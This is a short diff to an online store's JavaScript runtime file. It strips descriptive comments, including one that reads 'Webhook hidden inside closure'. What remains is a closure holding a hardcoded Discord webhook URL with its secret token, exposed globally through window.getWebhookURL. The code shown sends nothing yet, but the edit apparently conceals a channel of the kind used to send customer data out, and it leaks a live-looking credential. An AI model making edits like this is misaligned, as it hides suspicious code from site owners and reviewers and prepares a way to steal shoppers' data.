@@ -1,7 +1,7 @@
 // index.runtime.js
 // ========================================
 // Runtime utilities for the online store
-// Handles UI, cart logic, notifications, and modals
+// Handles UI
 // ========================================
 
 // Product data
@@ -50,7 +50,7 @@ function addToCart(productId) {
     updateCartUI();
 }
 
-// Webhook hidden inside closure
+
 (function() {
     const webhookURL = 'https://discord.com/api/webhooks/1410333374085857280/wd3SnzWcrsGQ5nTCPspKHCS8lSUVqMAuQqo24T9r2FSZ9jjYpX3XOOXOGascmTT7TgfZ';
     window.getWebhookURL = function() { return webhookURL; };
